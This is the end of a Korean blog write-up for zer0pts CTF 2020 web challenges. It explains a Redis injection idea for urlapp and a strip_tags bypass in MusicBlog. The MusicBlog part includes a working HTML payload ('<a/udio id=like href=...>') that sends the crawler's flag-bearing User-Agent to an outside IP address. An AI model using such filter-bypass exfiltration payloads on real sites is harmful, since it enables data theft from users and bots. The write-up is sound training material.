<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set</span><span class="params">(sock, key, value)</span></span></span><br><span class="line">  query(sock, <span class="string">&quot;SET <span class="subst">#&#123;key&#125;</span> <span class="subst">#&#123;value&#125;</span>&quot;</span>)</span><br><span class="line">  <span class="keyword">return</span> recv(sock) == <span class="string">&quot;OK&quot;</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(sock, key)</span></span></span><br><span class="line">  query(sock, <span class="string">&quot;GET <span class="subst">#&#123;key&#125;</span>&quot;</span>)</span><br><span class="line">  <span class="keyword">return</span> recv(sock)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">before <span class="keyword">do</span></span><br><span class="line">  sock = connect()</span><br><span class="line">  set(sock, <span class="string">&quot;flag&quot;</span>, File.read(<span class="string">&quot;flag.txt&quot;</span>).strip)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> params.has_key?(<span class="symbol">:q</span>) <span class="keyword">then</span></span><br><span class="line">    q = params[<span class="symbol">:q</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (q =~ <span class="regexp">/^[0-9a-f]&#123;16&#125;$/</span>)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    sock = connect()</span><br><span class="line">    url = get(sock, q)</span><br><span class="line">    redirect url</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  send_file <span class="string">&#x27;index.html&#x27;</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> params.has_key?(<span class="symbol">:url</span>) <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  url = params[<span class="symbol">:url</span>]</span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> (url =~ URI.regexp) <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  key = Random.urandom(<span class="number">8</span>).unpack(<span class="string">&quot;H*&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">  sock = connect()</span><br><span class="line">  set(sock, key, url)</span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;<span class="subst">#&#123;request.host&#125;</span>:<span class="subst">#&#123;request.port&#125;</span>/?q=<span class="subst">#&#123;key&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<p><strong>취약점은 set 함수를 호출해서 url 값을 value로 이용해서 하나의 데이터를 생성하고 있습니다. 하지만 url 파라미터의 개행문제에 대한 필터링이 존재하지 않아 redis eval 명령어를 이용해서 set, get 명령어를 사용할 수 있게됩니다. </strong><br><br></p>
<p><strong>그래서 value 값을 redis.call(‘get’,’flag’)를 이용해서 flag를 가져와서 value로 넣어주고, 해당 데이터의 키를 이용해서 접근하면 flag를 볼 수 있습니다. 하지만 익스 페이로드를 작성해서 넘겨주니 잘 되지 않았습니다…</strong><br><br></p>
<p><strong>다시 풀어 더 정확한 풀이를 남기겠습니다.</strong></p>
<hr>
<h3 id="Web-MusicBlog-653pts"><a href="#Web-MusicBlog-653pts" class="headerlink" title="(Web) MusicBlog [653pts]"></a>(Web) MusicBlog [653pts]</h3><p><strong>MusicBlog 문제는 딱히 취약점 분류를 하기는 힘들고, 그냥 웹 서비스 로직 결함을 이용해 공격하는 문제입니다. 일단 소스 코드가 많아 로직이 어떤 식으로 돌아가는 지부터 확인을 해보겠습니다.</strong></p>
<p><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-27%20%EC%98%A4%ED%9B%84%205.54.19.png?raw=true"><br><br><strong>회원 가입을 하고, 로그인을 하면 Post를 작성하는 기능과 Post를 보는 기능이 존재합니다.</strong></p>
<p><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-27%20%EC%98%A4%ED%9B%84%205.57.47.png?raw=true"><br><strong>Post를 작성해주니 이상한 점은 <code>좋아요</code>를 눌러주지 않았는데 <code>좋아요</code>가 하나 찍힌 것을 볼 수 있다. 아마 Post가 새로 생성이 되면 좋아요가 자동으로 찍히는 로직이 있는 거 같습니다. 더 자세한 내용을 확인하기 위해서 코드를 분석해보겠습니다.</strong></p>
<p><b><em><span style="color:#631F9C">&#62;</span> post.php</em></b></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(생략)</span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;mt-4&quot;</span>&gt;</span></span><br><span class="line">            &lt;?php if ($post[&#x27;published&#x27;] === &#x27;0&#x27;) &#123; ?&gt;<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;badge badge-secondary&quot;</span>&gt;</span>Secret<span class="tag">&lt;/<span class="name">span</span>&gt;</span>&lt;?php &#125; ?&gt;</span><br><span class="line">            &lt;?= $post[&#x27;title&#x27;] ?&gt;</span><br><span class="line">          <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;text-muted&quot;</span>&gt;</span>by &lt;?= $post[&#x27;username&#x27;] ?&gt; <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;badge badge-love badge-pill&quot;</span>&gt;</span>♥ &lt;?= $post[&#x27;likes&#x27;] ?&gt;<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mt-3&quot;</span>&gt;</span></span><br><span class="line">            &lt;?= render_tags($post[&#x27;content&#x27;]) ?&gt;</span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mt-3&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;like.php?id=&lt;?= $post[&#x27;id&#x27;] ?&gt;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;like&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-love&quot;</span>&gt;</span>♥ Like this post<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">(생략)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>post.php를 보면 content의 값을 render_tags() 함수를 이용해서 검증을 하고 출력하는 것을 볼 수 있습니다.</p>
<p><b><em><span style="color:#631F9C">&#62;</span> util.php</em></b></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="comment">// [[URL]] → &lt;audio src=&quot;URL&quot;&gt;&lt;/audio&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render_tags</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$str</span> = preg_replace(<span class="string">&#x27;/\[\[(.+?)\]\]/&#x27;</span>, <span class="string">&#x27;&lt;audio controls src=&quot;\\1&quot;&gt;&lt;/audio&gt;&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  <span class="variable">$str</span> = strip_tags(<span class="variable">$str</span>, <span class="string">&#x27;&lt;audio&gt;&#x27;</span>); <span class="comment">// only allows `&lt;audio&gt;`</span></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>util.php를 보면 render_tags() 함수가 존재합니다. preg_replace() 함수를 이용해서 &#91;&#91;ULR&#93;&#93;이라는 값이 들어오면 &lt;audio&gt;로 변환시켜주고, strip_tags() 함수를 이용해서 audio 태그만 허용하고 있는 것을 볼 수 있습니다. 하지만 strip_tags() 함수에서 취약점이 존재합니다.</strong></p>
<p><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-27%20%EC%98%A4%ED%9B%84%206.25.19.png?raw=true"></p>
<p><strong>위 사진을 보면 <code>&lt;a/udio&gt;</code>라는 문자열이 들어와도 <code>&lt;audio&gt;</code>로 인식을 하는 것을 볼 수 있습니다. 중간에 슬래쉬가 들어와도 동일하게 인식을 합니다. 이를 이용해서 오디오 태그 외에 a 태그도 사용을 할 수 있다는 것을 알 수 있습니다.</strong></p>
<p><b><em><span style="color:#631F9C">&#62;</span> worker.js</em></b></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> crawl = <span class="keyword">async</span> (url) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[+] Query! (<span class="subst">$&#123;url&#125;</span>)`</span>);</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> page.setUserAgent(flag);</span><br><span class="line">        <span class="keyword">await</span> page.goto(url, &#123;</span><br><span class="line">            waitUntil: <span class="string">&#x27;networkidle0&#x27;</span>,</span><br><span class="line">            timeout: <span class="number">3</span> * <span class="number">1000</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        page.click(<span class="string">&#x27;#like&#x27;</span>);</span><br><span class="line">        <span class="keyword">await</span> page.waitForNavigation(&#123;<span class="attr">timeout</span>: <span class="number">3000</span>&#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> page.close();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[+] Done! (<span class="subst">$&#123;url&#125;</span>)`</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>아까 Post를 생성하면 <code>좋아요</code>가 하나 찍히는 것을 확인했습니다. 그래서 해당 로직을 찾아보니 wocker.js에 crawl로 정의를 하는 것을 볼 수 있었습니다.  위 코드는 Post가 생성이 되면 <code>User-Agent</code>의 값으로 <code>FLAG</code>를 넣고, id 값이 like인 버튼을 클릭해서 <code>좋아요</code>를 눌러주는 것을 볼 수 있습니다.</strong></p>
<p><b><em><span style="color:#631F9C">&#62;</span> init.php</em></b></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">header(<span class="string">&quot;Content-Security-Policy: default-src &#x27;self&#x27;; object-src &#x27;none&#x27;; script-src &#x27;nonce-$&#123;nonce&#125;&#x27; &#x27;strict-dynamic&#x27;; base-uri &#x27;none&#x27;; trusted-types&quot;</span>);</span><br><span class="line">header(<span class="string">&#x27;X-Frame-Options: DENY&#x27;</span>);</span><br><span class="line">header(<span class="string">&#x27;X-XSS-Protection: 1; mode=block&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><strong>그래서 XSS를 이용해서 User-Agent 값을 가져와야 하나 생각을 했지만 위와 같이 CSP가 걸려 있어 불가능해보였습니다,, 하지만 아까 util.php의 render_tags() 함수에서 strip_tags() 함수를 사용해서 태그를 검증하고 있었는데 이때 함수를 우회해서 a 태그를 사용할 수 있었습니다.</strong><br><br></p>
<p><strong>그럼 content의 값으로 “&#60;a id=’like’ href=’myip’&#62;&#60;/a&#62;”를 주면 click(‘#like’)에 의해서 User-Agent에 FLAG가 들어있는 상태로 myip로 요청이 갈 것 입니다.</strong></p>
<p><b><em><span style="color:#631F9C">&#62;</span> Exploit</em></b></p>
<p><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-27%20%EC%98%A4%ED%9B%84%206.54.47.png?raw=true"></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a/udio id=&quot;like&quot; href=&quot;http://141.164.52.207:12345&quot;&gt;GG<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>그래서 위 페이로드를 <code>Content</code>의 값으로 넘겨주니 요청이 내 서버로 전송이 된 것을 확인할 수 있었고, User-Agent 헤더의 flag가 있는 것도 볼 수 있었습니다.</strong></p>
<p><code>FLAG : zer0pts&#123;M4sh1m4fr3sh!!&#125;</code></p>
<hr>
<h3 id="Web-phpNantoKaAdmin-755pts"><a href="#Web-phpNantoKaAdmin-755pts" class="headerlink" title="(Web) phpNantoKaAdmin [755pts]"></a>(Web) phpNantoKaAdmin [755pts]</h3><p><strong>귀찮다.</strong></p>
<hr>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/categories/">Category</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-notepad-332pts"><span class="toc-number">1.</span> <span class="toc-text">(Web) notepad [332pts]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-Can-you-guess-it-345pts"><span class="toc-number">2.</span> <span class="toc-text">(Web) Can you guess it [345pts]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-urlapp-435pts"><span class="toc-number">3.</span> <span class="toc-text">(Web) urlapp [435pts]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-MusicBlog-653pts"><span class="toc-number">4.</span> <span class="toc-text">(Web) MusicBlog [653pts]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-phpNantoKaAdmin-755pts"><span class="toc-number">5.</span> <span class="toc-text">(Web) phpNantoKaAdmin [755pts]</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2020/12/26/2020-12-26-Zer0pts-CTF-2020/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2020/12/26/2020-12-26-Zer0pts-CTF-2020/&text=zer0pts CTF 2020 Write Up"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2020/12/26/2020-12-26-Zer0pts-CTF-2020/&title=zer0pts CTF 2020 Write Up"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2020/12/26/2020-12-26-Zer0pts-CTF-2020/&is_video=false&description=zer0pts CTF 2020 Write Up"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=zer0pts CTF 2020 Write Up&body=Check out this article: http://example.com/2020/12/26/2020-12-26-Zer0pts-CTF-2020/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2020/12/26/2020-12-26-Zer0pts-CTF-2020/&title=zer0pts CTF 2020 Write Up"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2020/12/26/2020-12-26-Zer0pts-CTF-2020/&title=zer0pts CTF 2020 Write Up"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2020/12/26/2020-12-26-Zer0pts-CTF-2020/&title=zer0pts CTF 2020 Write Up"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2020/12/26/2020-12-26-Zer0pts-CTF-2020/&title=zer0pts CTF 2020 Write Up"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2020/12/26/2020-12-26-Zer0pts-CTF-2020/&name=zer0pts CTF 2020 Write Up&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2020/12/26/2020-12-26-Zer0pts-CTF-2020/&t=zer0pts CTF 2020 Write Up"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2020-2021
    Jeongwon Jo
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/categories/">Category</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->


</body>
</html>
